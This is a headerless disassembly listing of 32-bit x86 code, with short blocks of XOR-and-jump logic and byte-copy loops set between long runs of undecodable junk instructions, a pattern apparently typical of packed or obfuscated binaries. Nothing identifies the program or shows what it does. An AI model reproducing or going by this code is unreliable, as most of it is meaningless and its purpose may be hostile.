  40226d:	scas   eax,DWORD PTR es:[edi]
  40226e:	test   DWORD PTR [ebx],esp
  402270:	dec    esi
  402271:	(bad)  
  402272:	mov    eax,ds:0x503150d2
  402277:	sbb    esi,DWORD PTR [edx-0x5edaeecf]
  40227d:	ins    DWORD PTR es:[edi],dx
  40227e:	pop    ecx
  40227f:	cmc    
  402280:	mov    eax,ds:0xeb0b85f7
  402285:	xchg   ecx,eax
  402286:	or     eax,0xe030d0e1
  40228b:	pushf  
  40228c:	in     eax,dx
  40228d:	pop    edi
  40228e:	push   esp
  40228f:	adc    ah,ch
  402291:	ret    0x19b0
  402294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402295:	push   ss
  402296:	into   
  402297:	ror    al,0x57
  40229a:	lock int3 
  40229c:	sbb    al,0x34
  40229e:	mov    ebx,0xbb3a552e
  4022a3:	push   0x1a
  4022a5:	xlat   BYTE PTR ds:[ebx]
  4022a6:	jnp    0x40227c
  4022a8:	scas   eax,DWORD PTR es:[edi]
  4022a9:	cmp    eax,DWORD PTR [ebx+0x7d2b6810]
  4022af:	mov    ecx,0x57e555da
  4022b4:	pop    ecx
  4022b5:	pop    esi
  4022b6:	push   ebx
  4022b7:	in     eax,0xa
  4022b9:	sti    
  4022ba:	shl    BYTE PTR ds:0x3493cd7a,1
  4022c0:	fwait
  4022c1:	push   ecx
  4022c2:	xchg   ebp,eax
  4022c3:	shr    BYTE PTR [ebx],0x4
  4022c6:	push   edx
  4022c7:	shr    BYTE PTR [edi],cl
  4022c9:	mov    ebx,0xbb7c25f9
  4022ce:	ficomp WORD PTR [ebp+0x1370f9f9]
  4022d4:	adc    edx,0x37b1f1fe
  4022da:	(bad)  [ecx+0x50f9a155]
  4022e0:	loope  0x4022fc
  4022e2:	adc    al,0x71
  4022e4:	lods   al,BYTE PTR ds:[esi]
  4022e5:	cmp    DWORD PTR [esi],eax
  4022e7:	mov    edi,0xaf7c939c
  4022ec:	aas    
  4022ed:	icebp  
  4022ee:	mov    ds:0xd27346d7,eax
  4022f3:	sub    eax,DWORD PTR ss:[esi-0x3cda36b8]
  4022fa:	jo     0x4022ba
  4022fc:	dec    ecx
  4022fd:	sub    dh,dh
  4022ff:	or     bl,al
  402301:	je     0x402341
  402303:	pop    edx
  402304:	sub    al,0x95
  402306:	and    dl,BYTE PTR [ebp-0x6fe5031a]
  40230c:	pop    esp
  40230d:	mov    ebp,0xa1f80946
  402312:	xor    dh,bh
  402314:	push   0xb4d16c3e
  402319:	out    dx,eax
  40231a:	nop
  40231b:	inc    edi
  40231c:	fidivr WORD PTR [esi-0x47ea6314]
  402322:	(bad)  
  402323:	imul   ecx,DWORD PTR [esi+0x79],0x9d4db99a
  40232a:	(bad)  [eax+0x54]
  40232d:	pop    edi
  40232e:	in     eax,0x86
  402330:	pop    ebp
  402331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402332:	test   eax,0x59508b54
  402337:	adc    bh,cl
  402339:	scas   eax,DWORD PTR es:[edi]
  40233a:	test   eax,0xec6475b6
  40233f:	add    BYTE PTR [ebx-0x2fcc0383],cl
  402345:	not    ebx
  402347:	xor    edi,eax
  402349:	mov    ebx,DWORD PTR ds:0x4292bd
  40234f:	add    ebx,DWORD PTR ds:0x427cf7
  402355:	mov    DWORD PTR ds:0x4292bd,ebx
  40235b:	add    edi,ecx
  40235d:	movzx  ebx,WORD PTR ds:0x427598
  402364:	or     ebx,DWORD PTR ds:0x42c892
  40236a:	mov    DWORD PTR ds:0x427598,ebx
  402370:	add    edx,ecx
  402372:	imul   edx,edi
  402375:	mov    ebx,DWORD PTR ds:0x4292d5
  40237b:	sbb    DWORD PTR ds:0x427d0f,ebx
  402381:	mov    edi,DWORD PTR [ebp-0x8]
  402384:	mov    ebx,DWORD PTR [ebp-0x10]
  402387:	sbb    DWORD PTR ds:0x4292a1,0x3598
  402391:	sub    ebx,edi
  402393:	mov    DWORD PTR ds:0x427d13,0x71c6
  40239d:	cmp    ebx,edx
  40239f:	mov    DWORD PTR ds:0x42759c,0x6366
  4023a9:	ja     0x4023ce
  4023af:	movzx  edx,WORD PTR ds:0x4292d9
  4023b6:	xor    edx,DWORD PTR ds:0x4292a9
  4023bc:	mov    DWORD PTR ds:0x4292d9,edx
  4023c2:	mov    edx,DWORD PTR [ebp-0x4]
  4023c5:	xor    edx,eax
  4023c7:	add    edx,ecx
  4023c9:	jmp    0x402807
  4023ce:	mov    edx,DWORD PTR [ebp-0x2c]
  4023d1:	mov    edi,DWORD PTR [ebp-0x4]
  4023d4:	xor    edx,eax
  4023d6:	xor    edi,eax
  4023d8:	add    edi,ecx
  4023da:	add    edx,ecx
  4023dc:	imul   edx,edi
  4023df:	mov    edi,DWORD PTR [ebp-0x8]
  4023e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4023e5:	sub    ebx,edi
  4023e7:	cmp    ebx,edx
  4023e9:	ja     0x4023f7
  4023ef:	mov    edx,DWORD PTR [ebp-0x28]
  4023f2:	jmp    0x4027f9
  4023f7:	mov    edx,DWORD PTR [ebp-0x30]
  4023fa:	mov    edi,DWORD PTR [ebp-0x4]
  4023fd:	xor    edx,eax
  4023ff:	xor    edi,eax
  402401:	add    edi,ecx
  402403:	add    edx,ecx
  402405:	imul   edx,edi
  402408:	mov    edi,DWORD PTR [ebp-0x8]
  40240b:	mov    ebx,DWORD PTR [ebp-0x10]
  40240e:	sub    ebx,edi
  402410:	cmp    ebx,edx
  402412:	ja     0x402420
  402418:	mov    edx,DWORD PTR [ebp-0x2c]
  40241b:	jmp    0x4027f9
  402420:	mov    edx,DWORD PTR [ebp-0x34]
  402423:	mov    edi,DWORD PTR [ebp-0x4]
  402426:	xor    edx,eax
  402428:	xor    edi,eax
  40242a:	add    edi,ecx
  40242c:	add    edx,ecx
  40242e:	imul   edx,edi
  402431:	mov    edi,DWORD PTR [ebp-0x8]
  402434:	jmp    0x402554
  402439:	ret    
  40243a:	fwait
  40243b:	dec    ebp
  40243c:	int    0x4d
  40243e:	fld    QWORD PTR [ebx-0x63]
  402441:	out    0xff,al
  402443:	loop   0x4024a4
  402445:	aad    0xb9
  402447:	and    eax,0x7c768de6
  40244c:	jl     0x4024bf
  40244e:	jg     0x4024cc
  402450:	jl     0x4023fd
  402452:	jo     0x4023eb
  402454:	data16 cmp BYTE PTR [edi-0x68],bh
  402458:	xor    eax,0xa866d513
  40245d:	dec    esi
  40245e:	inc    esi
  40245f:	retf   0x4621
  402462:	ja     0x4023fd
  402464:	cli    
  402465:	cdq    
  402466:	push   ecx
  402467:	mov    edx,0xa40b72bc
  40246c:	mov    edx,0x53e6a01f
  402471:	push   eax
  402472:	xchg   edx,eax
  402473:	xchg   edi,eax
  402475:	outs   dx,DWORD PTR ds:[esi]
  402476:	or     DWORD PTR [ebp+eiz*1+0x4],edx
  40247a:	push   0x141cd7d3
  40247f:	pop    eax
  402480:	pop    edx
  402481:	xchg   esp,eax
  402482:	loopne 0x40243a
  402484:	lahf   
  402485:	mov    eax,ds:0xa9719f28
  40248a:	pop    edx
  40248b:	mov    ch,bl
  40248d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40248e:	xchg   edx,eax
  40248f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402490:	aad    0x81
  402492:	adc    ebp,DWORD PTR [ebx+0x21]
  402495:	push   es
  402496:	jne    0x402431
  402498:	call   0x590b:0x9b5b2bf6
  40249f:	inc    ebx
  4024a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024a1:	cmp    eax,0xf8af8e16
  4024a6:	pop    es
  4024a7:	mov    ds:0x6c1970a4,al
  4024ac:	rcl    esi,1
  4024ae:	fistp  DWORD PTR [ebx-0xd30ad74]
  4024b4:	mov    BYTE PTR [esi],cl
  4024b6:	loop   0x4024a5
  4024b8:	sub    eax,0x21cf5d91
  4024bd:	repz mov ecx,0xeb6eacef
  4024c3:	fistp  QWORD PTR [edx-0x60a0a8cc]
  4024c9:	jp     0x402508
  4024cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024cc:	loope  0x4024f4
  4024ce:	pop    ecx
  4024cf:	push   cs
  4024d0:	adc    bl,BYTE PTR [ecx]
  4024d2:	sbb    al,0xc4
  4024d4:	aas    
  4024d5:	shl    DWORD PTR [ebx],1
  4024d7:	push   0x7e777e91
  4024dc:	pop    esp
  4024dd:	aas    
  4024de:	(bad)  
  4024df:	adc    ebp,eax
  4024e1:	ret    0x863
  4024e4:	mov    al,ds:0xa9034906
  4024e9:	fisub  DWORD PTR ds:0xf6480114
  4024ef:	xchg   esi,eax
  4024f0:	out    dx,eax
  4024f1:	jbe    0x4024d2
  4024f3:	push   eax
  4024f4:	loope  0x402477
  4024f6:	mov    ds:0x913fe774,eax
  4024fb:	sbb    eax,ebp
  4024fd:	clc    
  4024fe:	mov    eax,ds:0x471a8e25
  402503:	adc    bl,bl
  402505:	imul   edi,DWORD PTR [edi-0x5d956c85],0x36
  40250c:	add    al,0x35
  40250e:	mov    ebx,0x23458ed
  402513:	mov    edx,0x255d6355
  402518:	xchg   ebp,eax
  402519:	push   es
  40251a:	xchg   ecx,eax
  40251b:	out    0x53,eax
  40251d:	dec    ebx
  40251e:	ret    
  40251f:	add    ah,BYTE PTR [eax-0x6f6108b4]
  402525:	mov    ch,0x12
  402527:	shr    edi,cl
  402529:	sub    esi,DWORD PTR [eax]
  40252b:	pop    esp
  40252c:	(bad)  
  40252d:	jmp    DWORD PTR [ecx+0x70966666]
  402533:	sbb    ecx,0xffffffd7
  402536:	sub    eax,0x8f58c3a2
  40253b:	mov    ecx,0x25ae9ade
  402540:	pusha  
  402541:	jnp    0x402535
  402543:	ins    BYTE PTR es:[edi],dx
  402544:	lock and BYTE PTR [eax+0x2f11d863],al
  40254b:	xchg   ebx,eax
  40254c:	xor    DWORD PTR [ebp+0x7fe65a71],edx
  402552:	mov    ecx,0xf05d8b6f
  402557:	sub    ebx,edi
  402559:	cmp    ebx,edx
  40255b:	ja     0x402569
  402561:	mov    edx,DWORD PTR [ebp-0x30]
  402564:	jmp    0x4027f9
  402569:	mov    edx,DWORD PTR [ebp-0x38]
  40256c:	mov    edi,DWORD PTR [ebp-0x4]
  40256f:	xor    edx,eax
  402571:	xor    edi,eax
  402573:	add    edi,ecx
  402575:	add    edx,ecx
  402577:	imul   edx,edi
  40257a:	mov    edi,DWORD PTR [ebp-0x8]
  40257d:	mov    ebx,DWORD PTR [ebp-0x10]
  402580:	sub    ebx,edi
  402582:	cmp    ebx,edx
  402584:	ja     0x402592
  40258a:	mov    edx,DWORD PTR [ebp-0x34]
  40258d:	jmp    0x4027f9
  402592:	mov    edx,DWORD PTR [ebp-0x3c]
  402595:	mov    edi,DWORD PTR [ebp-0x4]
  402598:	xor    edx,eax
  40259a:	xor    edi,eax
  40259c:	add    edx,ecx
  40259e:	add    edi,ecx
  4025a0:	jmp    0x4026c0
  4025a5:	push   ds
  4025a6:	in     al,0x25
  4025a8:	pop    es
  4025a9:	std    
  4025aa:	(bad)  [edx]
  4025ac:	stc    
  4025ad:	dec    edx
  4025ae:	mov    WORD PTR [ebp-0x45],?
  4025b1:	sti    
  4025b2:	loopne 0x402569
  4025b4:	cmp    eax,0x7c7c098e
  4025b9:	jno    0x40263a
  4025bb:	jl     0x402639
  4025bd:	xor    BYTE PTR [edx-0x1b],al
  4025c0:	in     al,dx
  4025c1:	sar    BYTE PTR ds:0x6ba918b7,1
  4025c7:	or     ecx,ebx
  4025c9:	inc    eax
  4025ca:	aas    
  4025cb:	aas    
  4025cc:	call   0x46ae:0x797e09aa
  4025d3:	clc    
  4025d4:	test   al,0x11
  4025d6:	jno    0x4025ba
  4025d8:	xchg   ebp,eax
  4025d9:	mov    ebx,0xab06d486
  4025de:	push   0x31
  4025e0:	and    esp,DWORD PTR [edi]
  4025e2:	(bad)  
  4025e3:	cmp    ecx,DWORD PTR [eax+0x45245b3f]
  4025e9:	cmp    al,0x25
  4025eb:	and    al,0xeb
  4025ed:	or     DWORD PTR [eax+esi*8-0x2e],ecx
  4025f1:	xlat   BYTE PTR ds:[ebx]
  4025f2:	jno    0x402574
  4025f4:	push   edx
  4025f5:	or     eax,0xa756030e
  4025fa:	inc    ecx
  4025fb:	mov    edi,0xc078f5a6
  402600:	(bad)
  402604:	mov    ds:0x5e17009a,al
  402609:	xchg   DWORD PTR [edx],edx
  40260b:	test   ecx,edi
  40260d:	(bad)  
  40260e:	sbb    DWORD PTR [ebx-0x7b500930],esi
  402614:	mov    WORD PTR [ebp+0x47],cs
  402617:	popf   
  402618:	or     DWORD PTR [ecx],edx
  40261a:	sub    BYTE PTR [edx-0x7505f019],ah
  402620:	cmp    edi,DWORD PTR [edx-0x60]
  402623:	clc    
  402624:	mov    ah,0xbd
  402626:	cmp    al,0xba
  402628:	and    dl,BYTE PTR [esi]
  40262a:	(bad)  
  40262b:	adc    edx,ebp
  40262d:	push   eax
  40262e:	cmp    DWORD PTR [ecx+0x71],0x7d
  402632:	ficomp DWORD PTR [eax+ebp*8+0x34]
  402636:	and    eax,0x3d129081
  40263b:	mov    al,ds:0x5a7ee033
  402640:	pop    eax
  402641:	das    
  402642:	mov    ch,0x71
  402644:	pop    eax
  402645:	fstp   DWORD PTR [ecx]
  402647:	les    di,DWORD PTR [edx+0x51]
  40264b:	jnp    0x402602
  40264d:	push   ecx
  40264e:	sbb    BYTE PTR [edi],0x8e
  402651:	shl    ecx,1
  402653:	adc    bl,ch
  402655:	rcr    DWORD PTR [edi],1
  402657:	fbld   TBYTE PTR [esi]
  402659:	rep ins DWORD PTR es:[edi],dx
  40265b:	hlt    
  40265c:	xchg   ebx,eax
  40265d:	out    0x48,eax
  40265f:	jl     0x402640
  402661:	push   ecx
  402662:	inc    DWORD PTR [edx+0x4c]
  402665:	fnstsw WORD PTR [edx+0x5e]
  402668:	mov    ah,bl
  40266a:	push   es
  40266b:	push   0x2d4c6600
  402670:	js     0x402617
  402672:	add    ebp,DWORD PTR [edi-0x4a75f60f]
  402678:	pop    es
  402679:	imul   ebx,DWORD PTR [ebx-0x74],0x10517879
  402680:	lods   al,BYTE PTR ds:[esi]
  402681:	adc    dl,al
  402683:	test   DWORD PTR [ebp-0x6de439b3],ebp
  402689:	mov    esi,0xeb4a37ed
  40268e:	into   
  40268f:	xor    DWORD PTR [esi-0x4ce11662],edi
  402695:	jmp    FWORD PTR [edi-0x261f0043]
  40269b:	nop
  40269c:	test   eax,0x614ccc4b
  4026a1:	xchg   DWORD PTR cs:[edi+eax*8],ebp
  4026a5:	push   edi
  4026a6:	and    al,0x63
  4026a8:	inc    ebx
  4026a9:	mov    al,ds:0x9755fb5a
  4026ae:	lds    edx,FWORD PTR [edx+0x5a872ae5]
  4026b4:	inc    ecx
  4026b5:	mov    edx,0xdbf33a7f
  4026ba:	push   edx
  4026bb:	mov    ch,cl
  4026bd:	pop    ss
  4026be:	sub    eax,0xd7af0f8b
  4026c3:	mov    edi,DWORD PTR [ebp-0x8]
  4026c6:	jmp    0x4027e6
  4026cb:	test   eax,0x4dcf8b5f
  4026d0:	sti    
  4026d1:	jge    0x40274c
  4026d3:	test   BYTE PTR [ebx],0x46
  4026d6:	adc    eax,0x901d37ab
  4026db:	or     DWORD PTR [eax],0x7c
  4026de:	jl     0x402751
  4026e0:	jg     0x40275e
  4026e2:	jl     0x40271b
  4026e4:	cli    
  4026e5:	js     0x4026e0
  4026e7:	shr    DWORD PTR [ebx],cl
  4026e9:	aad    0x71
  4026eb:	mov    ebp,esi
  4026ed:	enter  0xd296,0x11
  4026f1:	and    eax,0xae5ee0f7
  4026f6:	inc    esi
  4026f7:	jecxz  0x4026fb
  4026f9:	or     DWORD PTR [eax*1-0x6cd03387],0xfffffff0
  402701:	mov    dh,dh
  402703:	cmp    eax,0x193cf338
  402708:	(bad)  
  402709:	aam    0xe3
  40270b:	jne    0x40274a
  40270d:	test   al,0xa9
  40270f:	(bad)  [esp+eax*8-0x77]
  402713:	cmp    ebx,DWORD PTR [ebx+0x13fe5ae7]
  402719:	inc    esp
  40271a:	lods   eax,DWORD PTR ds:[esi]
  40271b:	and    DWORD PTR [ebp-0x62a311b3],ebx
  402721:	and    DWORD PTR [eax+0x1b28740a],0xffffffd3
  402728:	add    DWORD PTR [ebx-0x1cf4f939],0xffffffa6
  40272f:	xor    edx,DWORD PTR [esi]
  402731:	in     eax,dx
  402732:	push   edi
  402733:	fadd   st,st(6)
  402735:	loopne 0x402780
  402737:	outs   dx,BYTE PTR ds:[esi]
  402738:	dec    edx
  402739:	mov    cs,WORD PTR [esi]
  40273b:	cdq    
  40273c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40273d:	sbb    al,0x3f
  40273f:	cs das 
  402741:	mov    gs:0xe1198db8,eax
  402747:	push   0xffffffd0
  402749:	imul   esi,DWORD PTR ds:0xce01d8ae,0xffffffb3
  402750:	fst    st(3)
  402752:	fdivrp st(5),st
  402754:	out    0x8a,al
  402756:	call   eax
  402758:	dec    esp
  402759:	push   cs
  40275a:	sub    eax,DWORD PTR [ecx-0x26]
  40275d:	and    esi,esi
  40275f:	std    
  402760:	pop    edi
  402761:	(bad)  
  402762:	in     al,0xed
  402764:	pop    ebx
  402765:	inc    esp
  402766:	and    ebp,esi
  402768:	pop    ebx
  402769:	adc    eax,0x4d9c7329
  40276e:	repnz xor BYTE PTR [edx+esi*8],0x10
  402773:	cdq    
  402774:	adc    dh,ch
  402776:	sti    
  402777:	rol    BYTE PTR [ebx+esi*2-0x4eeb5985],cl
  40277e:	jmp    0xa76fb9e5
  402783:	xchg   edi,eax
  402784:	aaa    
  402785:	and    BYTE PTR [edx],dl
  402787:	test   al,0xec
  402789:	push   edi
  40278a:	mov    dl,0xc7
  40278c:	jae    0x40276c
  40278e:	mov    dl,0x56
  402790:	inc    edi
  402791:	stc    
  402792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402793:	dec    ebx
  402794:	and    eax,0xf2632081
  402799:	nop
  40279a:	jo     0x40276f
  40279c:	inc    eax
  40279d:	sbb    al,0xd5
  40279f:	push   esi
  4027a0:	add    BYTE PTR [esp+esi*8],dh
  4027a3:	out    0x91,eax
  4027a5:	or     BYTE PTR [ebp+0x7b3116f2],dh
  4027ab:	not    DWORD PTR [edx-0x40]
  4027ae:	cmc    
  4027af:	iret   
  4027b0:	imul   esi,DWORD PTR [ebx+0x79],0xae411493
  4027b7:	ds jmp 0x53ae85e0
  4027bd:	ret    
  4027be:	sbb    cl,BYTE PTR [edx+0x22]
  4027c1:	xchg   esp,eax
  4027c2:	lahf   
  4027c3:	scas   eax,DWORD PTR es:[edi]
  4027c4:	push   ds
  4027c5:	nop
  4027c6:	pop    ds
  4027c7:	enter  0xa309,0x86
  4027cb:	xor    bh,BYTE PTR [edx-0x614f501e]
  4027d1:	push   edx
  4027d2:	xchg   ebx,eax
  4027d3:	and    al,0x16
  4027d5:	je     0x4027df
  4027d7:	repz xor ecx,DWORD PTR [eax+0x6e]
  4027db:	mov    edx,0xeb086efe
  4027e0:	std    
  4027e1:	out    0x72,al
  4027e3:	imul   DWORD PTR [ecx]
  4027e5:	mov    cl,0x8b
  4027e7:	pop    ebp
  4027e8:	lock sub ebx,edi
  4027eb:	cmp    ebx,edx
  4027ed:	mov    edx,DWORD PTR [ebp-0x38]
  4027f0:	jbe    0x4027f9
  4027f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4027f9:	mov    edi,DWORD PTR [ebp-0x4]
  4027fc:	xor    edi,eax
  4027fe:	xor    edx,eax
  402800:	add    edi,ecx
  402802:	add    edx,ecx
  402804:	imul   edx,edi
  402807:	mov    DWORD PTR [ebp+0xc],edx
  40280a:	mov    edx,DWORD PTR [ebp+0xc]
  40280d:	mov    DWORD PTR [ebp-0x24],edx
  402810:	mov    edx,DWORD PTR [ebp-0x8]
  402813:	add    edx,DWORD PTR [ebp-0x40]
  402816:	jmp    0x402936
  40281b:	push   esp
  40281c:	in     al,dx
  40281d:	dec    ebx
  40281e:	dec    ebp
  40281f:	pop    ebx
  402820:	jge    0x402878
  402822:	in     eax,0xc9
  402824:	std    
  402825:	ja     0x402846
  402827:	pop    edi
  402828:	push   eax
  402829:	cwde   
  40282a:	mov    dh,0x84
  40282c:	or     edi,DWORD PTR [esp+edi*2+0x71]
  402830:	jg     0x4028ae
  402832:	jl     0x402898
  402834:	push   edx
  402835:	ds push ds
  402837:	push   cs
  402838:	sbb    eax,0x2d26cc86
  40283d:	fcom   QWORD PTR [edx]
  40283f:	fucomi st,st(0)
  402841:	cmp    eax,0x655e3099
  402846:	mov    al,ds:0xfb91d177
  40284b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40284c:	repnz (bad) 
  40284e:	or     bh,al
  402850:	pusha  
  402851:	call   0x3d52:0xeb97308f
  402858:	add    DWORD PTR [eax+0x34],0xffffffe8
  40285c:	jmp    0xe1cf2a4e
  402861:	push   ss
  402862:	inc    edi
  402863:	inc    ebp
  402864:	ret    
  402865:	leave  
  402866:	jmp    0x40281c
  402868:	fcmovbe st,st(5)
  40286a:	leave  
  40286b:	jb     0x40281e
  40286d:	cmp    DWORD PTR [edx*1-0x6c58d075],esi
  402874:	addr16 ds sahf 
  402877:	cmp    ebp,DWORD PTR [ecx+0x4e]
  40287a:	jp     0x402871
  40287c:	sbb    DWORD PTR [esi-0x74d130ba],ebp
  402882:	shr    DWORD PTR [edi],1
  402884:	sahf   
  402885:	or     BYTE PTR [eax-0x6e],0xf
  402889:	and    al,0xa8
  40288b:	pop    esp
  40288c:	ins    BYTE PTR es:[edi],dx
  40288d:	ja     0x402908
  40288f:	xor    dl,al
  402891:	and    dl,BYTE PTR [eax+ebx*2-0x7a]
  402895:	dec    ecx
  402896:	adc    DWORD PTR [ebp+0x43],0x24
  40289a:	cli    
  40289b:	pop    es
  40289c:	sbb    ebx,ebp
  40289e:	push   DWORD PTR [eax+0x41]
  4028a1:	jb     0x4028fa
  4028a3:	loopne 0x402873
  4028a5:	mov    dl,0x7c
  4028a7:	cmc    
  4028a8:	jnp    0x40285d
  4028aa:	add    esi,ebx
  4028ac:	jmp    0x6ae15e13
  4028b1:	push   ebp
  4028b2:	mov    edx,0xfaabe3ca
  4028b7:	mov    bl,0xcc
  4028b9:	scas   al,BYTE PTR es:[edi]
  4028ba:	imul   DWORD PTR [ecx-0x62]
  4028bd:	sub    esi,edx
  4028bf:	push   0xaa300272
  4028c4:	cmp    al,0x99
  4028c6:	add    eax,0xf9b3e5c2
  4028cb:	push   0xffffffb4
  4028cd:	rcl    DWORD PTR [edi],1
  4028cf:	xor    al,0xea
  4028d1:	push   0x87928e05
  4028d6:	aam    0xf2
  4028d8:	aad    0xe
  4028da:	into   
  4028db:	add    DWORD PTR [esi-0x3302a6c3],0x53745d3b
  4028e5:	sbb    al,0x4c
  4028e7:	mov    al,0x67
  4028e9:	xor    DWORD PTR [ecx],ebx
  4028eb:	lahf   
  4028ec:	in     al,dx
  4028ed:	mov    ds:0x53fb77aa,al
  4028f2:	shl    DWORD PTR [ebx+0x3b],0x79
  4028f6:	imul   esp,DWORD PTR ss:[edx+0x2d],0xffffffbd
  4028fb:	aad    0xd7
  4028fd:	leave  
  4028fe:	cli    
  4028ff:	add    eax,0xe3b1556d
  402904:	addr16 std 
  402906:	test   al,0xda
  402908:	inc    edx
  402909:	push   ecx
  40290a:	pop    ebp
  40290b:	outs   dx,DWORD PTR ds:[esi]
  40290c:	inc    edx
  40290d:	and    DWORD PTR [edx+0x1b5230d1],eax
  402913:	sub    BYTE PTR [edi+0x3fb2d621],dl
  402919:	out    0x7f,eax
  40291b:	cmp    DWORD PTR [esi+0x33],ecx
  40291e:	jge    0x402983
  402920:	jo     0x4028bd
  402922:	cmp    al,0x33
  402924:	push   0xffffffdc
  402926:	pop    edx
  402927:	retf   
  402928:	adc    al,0xfe
  40292a:	xlat   BYTE PTR ds:[ebx]
  40292b:	jmp    0xdd99:0xb17da420
  402932:	cdq    
  402933:	add    ebp,DWORD PTR [esi-0x17ba3872]
  402939:	xor    eax,0x89f89c85
  40293e:	push   ebp
  40293f:	in     al,0xc7
  402941:	inc    ebp
  402942:	hlt    
  402943:	xor    al,0x85
  402945:	pushf  
  402946:	clc    
  402947:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40294e:	mov    edx,DWORD PTR [ebp-0x18]
  402951:	xor    edx,eax
  402953:	add    edx,ecx
  402955:	jmp    0x402ae2
  40295a:	mov    edx,DWORD PTR [ebp-0x18]
  40295d:	xor    edx,eax
  40295f:	add    edx,DWORD PTR [ebp-0x14]
  402962:	mov    edi,DWORD PTR [ebp-0x1c]
  402965:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  40296c:	mov    BYTE PTR [ebp+0xf],dl
  40296f:	mov    edx,DWORD PTR [ebp-0xc]
  402972:	xor    edx,eax
  402974:	add    edx,DWORD PTR [ebp-0x14]
  402977:	mov    edi,DWORD PTR [ebp-0x1c]
  40297a:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  402981:	mov    BYTE PTR [ebp+0xb],dl
  402984:	mov    dl,BYTE PTR [ebp+0xf]
  402987:	mov    edi,DWORD PTR [ebp-0xc]
  40298a:	jmp    0x402aaa
  40298f:	inc    eax
  402990:	(bad)
  402993:	imul   edi,DWORD PTR [edx+0x43],0x97beacfd
  40299a:	jno    0x4029da
  40299c:	in     al,dx
  40299d:	add    BYTE PTR [ecx],ch
  40299f:	cdq    
  4029a0:	or     bh,BYTE PTR [esp+edi*2+0x71]
  4029a4:	jg     0x402a22
  4029a6:	jl     0x402937
  4029a8:	adc    bl,BYTE PTR [ecx]
  4029aa:	aad    0xe4
  4029ac:	jae    0x402a1e
  4029ae:	adc    eax,0xccdf32b9
  4029b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029b4:	ss pop ebx
  4029b6:	rcr    DWORD PTR [ebp-0x1b],1
  4029b9:	popa   
  4029ba:	cld    
  4029bb:	retf   
  4029bc:	stos   DWORD PTR es:[edi],eax
  4029bd:	mov    ebp,0x94c6c316
  4029c2:	add    esi,0xffffff87
  4029c5:	push   eax
  4029c6:	push   esp
  4029c7:	hlt    
  4029c8:	xchg   esi,eax
  4029c9:	or     al,0x77
  4029cb:	pop    ebx
  4029cd:	into   
  4029ce:	jl     0x40297e
  4029d0:	push   ecx
  4029d1:	sbb    eax,0xdbf24c48
  4029d6:	sbb    DWORD PTR [ecx-0x4c609e37],ebx
  4029dc:	sbb    ecx,DWORD PTR [esi+esi*1-0x5eb89ba2]
  4029e3:	sub    eax,0x5a0a496c
  4029e8:	lods   al,BYTE PTR ds:[esi]
  4029e9:	fwait
  4029ea:	dec    ebp
  4029eb:	loope  0x402987
  4029ed:	and    eax,0x3597a4f
  4029f2:	jge    0x402a1d
  4029f4:	jmp    0x495f:0xa1b14598
  4029fb:	cmp    al,0xfe
  4029fd:	jle    0x402a49
  4029ff:	pop    ebx
  402a00:	bound  edi,QWORD PTR [edx+0x239178b0]
  402a06:	in     eax,0xd7
  402a08:	aaa    
  402a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a0b:	xchg   esp,eax
  402a0c:	adc    eax,0x2ba9861d
  402a11:	(bad)  
  402a12:	sub    esi,eax
  402a14:	cmp    ch,al
  402a16:	(bad)  
  402a17:	loop   0x402a83
  402a19:	int3   
  402a1a:	sar    dh,1
  402a1c:	cmp    al,0xf3
  402a1e:	dec    edx
  402a1f:	cmp    ch,BYTE PTR [ebp-0x5054ea4]
  402a25:	mov    eax,0x776417ef
  402a2a:	mov    edi,0xa4a1299b
  402a2f:	adc    al,BYTE PTR [esi]
  402a31:	in     al,0x64
  402a33:	pop    ebp
  402a34:	push   ecx
  402a35:	aam    0x57
  402a37:	fstp   st(5)
  402a39:	bound  ecx,QWORD PTR [eax-0x7ce2d12b]
  402a3f:	and    ecx,DWORD PTR [eax]
  402a41:	call   0x62a8:0x177f3dc7
  402a48:	in     eax,0x6
  402a4a:	outs   dx,BYTE PTR ds:[esi]
  402a4b:	sti    
  402a4c:	sbb    al,0x48
  402a4e:	loopne 0x402a09
  402a50:	pop    esp
  402a51:	push   eax
  402a52:	or     ebp,ebp
  402a54:	popa   
  402a55:	xor    BYTE PTR [esi+0xc],al
  402a58:	or     ah,ah
  402a5a:	scas   al,BYTE PTR es:[edi]
  402a5b:	and    DWORD PTR [edx+ecx*8],0xc82f2117
  402a62:	test   DWORD PTR [edx],ecx
  402a64:	cld    
  402a65:	cmp    eax,0x2b9c27a3
  402a6a:	les    ebp,FWORD PTR [ebp+0xf476000]
  402a70:	sar    BYTE PTR [ecx+0x1b],0x8f
  402a74:	jl     0x402a64
  402a76:	pop    es
  402a77:	jne    0x402a39
  402a79:	xchg   ebx,eax
  402a7a:	adc    DWORD PTR [ecx-0x5a442982],ebx
  402a80:	shl    DWORD PTR [esi+0x5ca76ba],cl
  402a86:	ss in  eax,dx
  402a88:	(bad)
  402a8b:	sub    al,BYTE PTR [esi]
  402a8d:	fiadd  WORD PTR ds:[eax-0x5ae7ad3b]
  402a94:	cmp    eax,DWORD PTR [edx+0x21123e51]
  402a9a:	add    BYTE PTR [esi+ecx*2-0x61],0x19
  402a9f:	mov    esp,0x33d8e91f
  402aa4:	repz enter 0xef60,0xbf
  402aa9:	popf   
  402aaa:	xor    edi,eax
  402aac:	add    edi,DWORD PTR [ebp-0x14]
  402aaf:	mov    ebx,DWORD PTR [ebp-0x1c]
  402ab2:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  402ab9:	mov    dl,BYTE PTR [ebp+0xb]
  402abc:	mov    edi,DWORD PTR [ebp-0x18]
